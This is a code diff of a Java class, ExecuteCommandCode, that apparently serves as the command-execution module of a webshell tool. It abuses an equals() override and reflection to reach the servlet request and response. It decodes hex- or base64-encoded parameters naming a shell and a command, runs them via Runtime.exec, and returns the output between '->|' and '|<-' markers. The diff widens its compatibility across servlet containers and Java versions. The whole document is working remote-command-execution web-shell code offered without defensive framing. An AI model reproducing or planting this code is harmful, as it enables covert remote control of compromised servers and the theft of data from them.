@@ -1,79 +1,123 @@
-import javax.servlet.ServletRequest;
-import javax.servlet.ServletResponse;
+import javax.servlet.http.HttpServletRequest;
+import javax.servlet.http.HttpServletResponse;
 import javax.servlet.jsp.PageContext;
 import java.io.BufferedReader;
 import java.io.ByteArrayOutputStream;
 import java.io.InputStream;
 import java.io.InputStreamReader;
+import java.lang.reflect.Field;
 
 public class ExecuteCommandCode {
+    public HttpServletRequest request = null;
+    public HttpServletResponse response = null;
+    public String encoder;
+    public String cs;
+
     @Override
     public boolean equals(Object obj) {
-        PageContext page = (PageContext)obj;
-        ServletRequest request = page.getRequest();
-        ServletResponse response = page.getResponse();
-        String encoder = request.getParameter("encoder")!=null?request.getParameter("encoder"):"";
-        String cs=request.getParameter("charset")!=null?request.getParameter("charset"):"UTF-8";
+        if (obj instanceof PageContext) {
+            PageContext page = (PageContext) obj;
+            request = (HttpServletRequest) page.getRequest();
+            response = (HttpServletResponse) page.getResponse();
+        } else if (obj instanceof HttpServletRequest) {
+            request = (HttpServletRequest) obj;
+            try {
+                Field req = request.getClass().getDeclaredField("request");
+                req.setAccessible(true);
+                HttpServletRequest request2 = (HttpServletRequest) req.get(request);
+                Field resp = request2.getClass().getDeclaredField("response");
+                resp.setAccessible(true);
+                response = (HttpServletResponse) resp.get(request2);
+            } catch (Exception e) {
+                e.printStackTrace();
+            }
+
+        } else if (obj instanceof HttpServletResponse) {
+            response = (HttpServletResponse) obj;
+            try {
+                Field resp = response.getClass().getDeclaredField("response");
+                resp.setAccessible(true);
+                HttpServletResponse response2 = (HttpServletResponse) resp.get(response);
+                Field req = response2.getClass().getDeclaredField("request");
+                req.setAccessible(true);
+                request = (HttpServletRequest) req.get(response2);
+            } catch (Exception e) {
+                e.printStackTrace();
+            }
+        }
+        encoder = request.getParameter("encoder") != null ? request.getParameter("encoder") : "";
+        cs = request.getParameter("charset") != null ? request.getParameter("charset") : "UTF-8";
         StringBuffer output = new StringBuffer("");
         StringBuffer sb = new StringBuffer("");
         try {
             response.setContentType("text/html");
             request.setCharacterEncoding(cs);
             response.setCharacterEncoding(cs);
-            String var1 = EC(decode(request.getParameter("var1")+"", encoder,cs),encoder,cs);
-            String var2 = EC(decode(request.getParameter("var2")+"", encoder,cs),encoder,cs);
+            String var1 = EC(decode(request.getParameter("var1") + ""));
+            String var2 = EC(decode(request.getParameter("var2") + ""));
             output.append("->" + "|");
-            sb.append(ExecuteCommandCode(var1,var2,cs));
+            sb.append(ExecuteCommandCode(var1, var2));
             output.append(sb.toString());
             output.append("|" + "<-");
-            page.getOut().print(output.toString());
+            response.getWriter().print(output.toString());
         } catch (Exception e) {
             sb.append("ERROR" + ":// " + e.toString());
         }
         return true;
     }
-    String EC(String s,String encoder,String cs) throws Exception {
-        if(encoder.equals("hex") || encoder == "hex") return s;
+
+    String EC(String s) throws Exception {
+        if (encoder.equals("hex")) return s;
         return new String(s.getBytes(), cs);
     }
-    String decode(String str, String encode ,String cs) throws Exception{
-        if(encode.equals("hex") || encode=="hex"){
-            if(str=="null"||str.equals("null")){
+
+    String decode(String str) throws Exception {
+        if (encoder.equals("hex")) {
+            if (str == null || str.equals("")) {
                 return "";
             }
             String hexString = "0123456789ABCDEF";
             str = str.toUpperCase();
-            ByteArrayOutputStream baos = new ByteArrayOutputStream(str.length()/2);
+            ByteArrayOutputStream baos = new ByteArrayOutputStream(str.length() / 2);
             String ss = "";
-            for (int i = 0; i < str.length(); i += 2){
+            for (int i = 0; i < str.length(); i += 2) {
                 ss = ss + (hexString.indexOf(str.charAt(i)) << 4 | hexString.indexOf(str.charAt(i + 1))) + ",";
                 baos.write((hexString.indexOf(str.charAt(i)) << 4 | hexString.indexOf(str.charAt(i + 1))));
             }
             return baos.toString("UTF-8");
-        }else if(encode.equals("base64") || encode == "base64"){
+        } else if (encoder.equals("base64")) {
             byte[] bt = null;
-            sun.misc.BASE64Decoder decoder = new sun.misc.BASE64Decoder();
-            bt = decoder.decodeBuffer(str);
-            return new String(bt,"UTF-8");
+            try {
+                Class clazz = Class.forName("sun.misc.BASE64Decoder");
+                bt = (byte[]) clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str);
+            } catch (ClassNotFoundException e) {
+                Class clazz = Class.forName("java.util.Base64");
+                Object decoder = clazz.getMethod("getDecoder").invoke(null);
+                bt = (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, str);
+            }
+            return new String(bt, "UTF-8");
         }
         return str;
     }
-    String ExecuteCommandCode(String cmdPath, String command , String cs) throws Exception {
+
+    String ExecuteCommandCode(String cmdPath, String command) throws Exception {
         StringBuffer sb = new StringBuffer("");
-        String[] c = { cmdPath, !isWin() ? "-c" : "/c", command };
+        String[] c = {cmdPath, !isWin() ? "-c" : "/c", command};
         Process p = Runtime.getRuntime().exec(c);
-        CopyInputStream(p.getInputStream(), sb , cs);
-        CopyInputStream(p.getErrorStream(), sb , cs);
+        CopyInputStream(p.getInputStream(), sb);
+        CopyInputStream(p.getErrorStream(), sb);
         return sb.toString();
     }
+
     boolean isWin() {
-        String osname = (String)System.getProperty("os.name");
+        String osname = System.getProperty("os.name");
         osname = osname.toLowerCase();
         if (osname.startsWith("win"))
             return true;
         return false;
     }
-    void CopyInputStream(InputStream is, StringBuffer sb, String cs) throws Exception {
+
+    void CopyInputStream(InputStream is, StringBuffer sb) throws Exception {
         String l;
         BufferedReader br = new BufferedReader(new InputStreamReader(is, cs));
         while ((l = br.readLine()) != null) {
